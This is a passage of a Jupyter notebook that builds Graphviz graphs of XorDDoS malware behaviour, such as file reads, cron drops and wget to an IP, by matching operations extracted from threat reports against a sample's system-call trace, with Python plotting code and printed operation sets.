text-anchor=\"middle\" x=\"166.3\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"27.3\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"27.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M134.49,-88.42C123.2,-82.62 110.53,-75.79 99.3,-69 83.49,-59.43 66.48,-47.7 52.97,-38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"54.79,-35 44.64,-31.96 50.68,-40.66 54.79,-35\"/>\n<text text-anchor=\"middle\" x=\"116.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.read</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"115.3\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"115.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M155.98,-86.8C148.69,-74.66 138.81,-58.19 130.61,-44.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"133.4,-42.37 125.26,-35.6 127.4,-45.97 133.4,-42.37\"/>\n<text text-anchor=\"middle\" x=\"163.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.drop</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"217.3\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"217.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M176.62,-86.8C183.9,-74.66 193.78,-58.19 201.98,-44.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"205.2,-45.97 207.34,-35.6 199.19,-42.37 205.2,-45.97\"/>\n<text text-anchor=\"middle\" x=\"212.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"303.3\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"303.3\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M198.68,-88.6C210.14,-82.82 222.99,-75.95 234.3,-69 249.35,-59.75 265.38,-48.24 278.19,-38.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"280.66,-41.12 286.5,-32.28 276.42,-35.55 280.66,-41.12\"/>\n<text text-anchor=\"middle\" x=\"272.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.read</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3970>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"636pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 635.84 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 631.84,-127 631.84,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"314.95\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"314.95\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"40.95\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"40.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M239.56,-100.6C153.39,-95.93 22.2,-86.09 6.95,-69 -0.78,-60.35 4.5,-49.85 12.99,-40.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"15.48,-43.18 20.3,-33.74 10.65,-38.11 15.48,-43.18\"/>\n<text text-anchor=\"middle\" x=\"29.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M243.89,-97.85C188.3,-92.15 116.18,-82.49 89.95,-69 78.12,-62.92 67.46,-52.91 59.12,-43.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"61.77,-41.15 52.69,-35.7 56.39,-45.63 61.77,-41.15\"/>\n<text text-anchor=\"middle\" x=\"115.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"279.95\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"279.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M243.98,-97.77C204.94,-92.72 162.02,-83.9 149.95,-69 123.06,-35.81 195.17,-24.62 242.46,-20.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"242.99,-24.34 252.71,-20.14 242.49,-17.36 242.99,-24.34\"/>\n<text text-anchor=\"middle\" x=\"186.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M270.91,-90.17C261.41,-85.06 252.55,-78.18 246.95,-69 240.85,-59.01 246.49,-48.15 254.72,-39.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"257.31,-41.47 262.05,-31.99 252.43,-36.45 257.31,-41.47\"/>\n<text text-anchor=\"middle\" x=\"269.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M307.86,-86.8C302.91,-74.78 296.21,-58.51 290.62,-44.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"293.82,-43.51 286.78,-35.6 287.35,-46.18 293.82,-43.51\"/>\n<text text-anchor=\"middle\" x=\"318.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M332.65,-87.13C340.72,-77.34 347.22,-64.84 340.95,-54 334.84,-43.46 324.23,-35.82 313.55,-30.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"314.82,-27.15 304.26,-26.23 311.94,-33.53 314.82,-27.15\"/>\n<text text-anchor=\"middle\" x=\"369.45\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"472.95\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"472.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M354.59,-89.37C368.86,-83.62 384.9,-76.57 398.95,-69 415.79,-59.92 433.58,-47.98 447.5,-38.04\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"449.58,-40.86 455.63,-32.16 445.48,-35.19 449.58,-40.86\"/>\n<text text-anchor=\"middle\" x=\"445.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M384.65,-97.14C421.57,-91.91 461.6,-83.13 472.95,-69 478.07,-62.62 479.42,-54.17 479.08,-46.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"482.55,-45.59 477.91,-36.06 475.6,-46.4 482.55,-45.59\"/>\n<text text-anchor=\"middle\" x=\"500.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"584.95\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"584.95\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M390.99,-101.45C432.76,-97.64 484.54,-88.84 526.95,-69 540.57,-62.63 553.49,-52.12 563.65,-42.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"566.27,-44.71 570.86,-35.16 561.32,-39.76 566.27,-44.71\"/>\n<text text-anchor=\"middle\" x=\"571.95\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3940>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.82,-87.18C56.57,-81.8 52.57,-75.54 50.34,-69 47.3,-60.09 50.29,-50.87 55.22,-42.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"58.14,-44.75 61.15,-34.59 52.46,-40.65 58.14,-44.75\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.86,-86.98C81.87,-81.29 82.84,-74.9 83.34,-69 83.98,-61.54 83.52,-53.47 82.62,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.07,-45.47 81.14,-36.09 79.15,-46.5 86.07,-45.47\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3970>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Trendmicro2.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M60.82,-87.18C56.57,-81.8 52.57,-75.54 50.34,-69 47.3,-60.09 50.29,-50.87 55.22,-42.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"58.14,-44.75 61.15,-34.59 52.46,-40.65 58.14,-44.75\"/>\n<text text-anchor=\"middle\" x=\"66.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.find</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.86,-86.98C81.87,-81.29 82.84,-74.9 83.34,-69 83.98,-61.54 83.52,-53.47 82.62,-46.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"86.07,-45.47 81.14,-36.09 79.15,-46.5 86.07,-45.47\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.wget</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3940>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Trendmicro2.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"176pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 176.34 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 172.34,-127 172.34,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M57.48,-87.29C52.57,-82 47.97,-75.75 45.34,-69 41.65,-59.49 45.6,-49.86 51.83,-41.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"54.65,-43.72 58.63,-33.9 49.39,-39.09 54.65,-43.72\"/>\n<text text-anchor=\"middle\" x=\"67.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M84.91,-87C88.31,-77.38 91.19,-65.1 89.34,-54 88.88,-51.24 88.23,-48.41 87.47,-45.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"90.72,-44.27 84.36,-35.8 84.05,-46.39 90.72,-44.27\"/>\n<text text-anchor=\"middle\" x=\"128.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x1d665eb3970>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import graphviz\n",
    "\n",
    "class ItemMapper:\n",
    "    def __init__(self) -> None:\n",
    "        self.mapper = {}\n",
    "        self.index_counter:int = 1\n",
    "        # self.pretty_name = {\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        #     \"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        #     \"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "        # }\n",
    "        pass\n",
    "    def addItem(self, item:str) -> str:\n",
    "        # item = self.prettifyName(item) # 先不在這做~\n",
    "        if item in self.mapper.keys():\n",
    "            return self.mapper.get(item)\n",
    "        self.mapper[item] = str(self.index_counter)\n",
    "        self.index_counter += 1\n",
    "        return str(self.index_counter - 1)\n",
    "    def getSymbol(self, item:str):\n",
    "        return self.mapper.get(item, None)\n",
    "    # def prettifyName(self, item:str) -> str:\n",
    "    #     changed = self.pretty_name.get(item, None)\n",
    "    #     if changed:\n",
    "    #         return changed\n",
    "    #     return item\n",
    "\n",
    "def draw_asg_op_graph(asg_OPset: list[OperationPair], family=None):\n",
    "    dot = graphviz.Digraph(f'{family}_asg_OPset', comment='The Operational Pair Graph') \n",
    "    dot.node('Start', label=\"Malware (Subject)\")\n",
    "    mapper = ItemMapper()\n",
    "    for op in asg_OPset:\n",
    "        node_id = mapper.addItem(op.object)\n",
    "        dot.node(node_id, label=prettifyName(op.object)) # rename partial regex\n",
    "        if op.action:\n",
    "            dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "\n",
    "    # dot.graph_attr.update(ratio=\"0.4\")\n",
    "    u = dot.unflatten(stagger=3, fanout=True)\n",
    "    display(u)\n",
    "    del mapper\n",
    "    return u\n",
    "\n",
    "def draw_ctd_op_graph(fset:FamilySet):\n",
    "    for rem in fset.rem_lst:\n",
    "        # doc_OPset\n",
    "        if rem.doc_OPset is None or len(rem.doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} raw doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_doc_OPset\n",
    "        if rem.match_doc_OPset is None or len(rem.match_doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.match_doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} matched doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_ASG_OPset\n",
    "        if rem.OPset_order_index is None or len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in [fset.sample.OPset_ordered[i] for i in rem.OPset_order_index]:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"matched ASG OPset for doc {rem.reportname}\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "    return\n",
    "\n",
    "draw_asg_op_graph(sample.OPset, family=family)\n",
    "draw_ctd_op_graph(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: print matched sentence for specific document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Report: Xorddos-Microsoft.csv. Matched OP count: 0\n"
     ]
    }
   ],
   "source": [
    "# 印出 matched 句子\n",
    "report_id = 3\n",
    "reportname = fset.rem_lst[report_id].reportname\n",
    "print(f\"Report: {reportname}. Matched OP count: {len(fset.rem_lst[report_id].match_doc_OPset)}\")\n",
    "for i, op in enumerate(fset.rem_lst[report_id].match_doc_OPset):\n",
    "    print(f\"--\\nOP #{op.step_number} {op.action} {op.object} {op.original_object}\")\n",
    "    print(f\"{op.original_sentence}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set()\n",
      "{<OP act=have, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=0x[0-9a-zA-Z]{8}>, <OP act=eserve, obj=0x[0-9a-zA-Z]{8}>, <OP act=r1,r2,r10,r11,lr, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=add, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=^sed$>, <OP act=look, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=0x[0-9a-zA-Z]{8}>, <OP act=go, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=svc, obj=0x[0-9a-zA-Z]{8}>, <OP act=pack, obj=0x[0-9a-zA-Z]{8}>, <OP act=find, obj=0x[0-9a-zA-Z]{8}>}\n",
      "{<OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=modify, obj=/etc/rc>, <OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+>, <OP act=None, obj=/etc/rc>}\n",
      "{<OP act=add, obj=/etc/init.d/>, <OP act=add, obj=/etc/rc>, <OP act=format, obj=/etc/rc>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=None, obj=/proc/>, <OP act=open, obj=/proc/>, <OP act=format, obj=^sed$>, <OP act=read, obj=/proc/>, <OP act=execute, obj=/etc/rc>, <OP act=give, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=uname(.)($)>}\n",
      "{<OP act=open, obj=nsswitch.conf>, <OP act=se, obj=^sed$>, <OP act=start, obj=/etc/init.d/>, <OP act=None, obj=/sys/>, <OP act=None, obj=/proc/>, <OP act=gather, obj=/proc/>, <OP act=None, obj=UID>, <OP act=se, obj=/etc/rc>, <OP act=open, obj=resolv.conf>}\n"
     ]
    }
   ],
   "source": [
    "# 測試區\n",
    "for rem in fset.rem_lst:\n",
    "    print(rem.doc_OPset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bin/sed</th>\n",
       "      <th>/etc/rc</th>\n",
       "      <th>/etc/init.d/</th>\n",
       "      <th>/proc/</th>\n",
       "      <th>/etc/sed</th>\n",
       "      <th>/selinux</th>\n",
       "      <th>/sys/</th>\n",
       "      <th>bin/</th>\n",
       "      <th>lsb-release</th>\n",
       "      <th>uname(.)($)</th>\n",
       "      <th>...</th>\n",
       "      <th>^sh$</th>\n",
       "      <th>^sed$</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}</th>\n",
       "      <th>eth[0-9]$</th>\n",
       "      <th>0x[0-9a-zA-Z]{8}</th>\n",
       "      <th>permission:{0,1}[0-9]{0,4}</th>\n",
       "      <th>UID</th>\n",
       "      <th>GID</th>\n",
       "      <th>match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
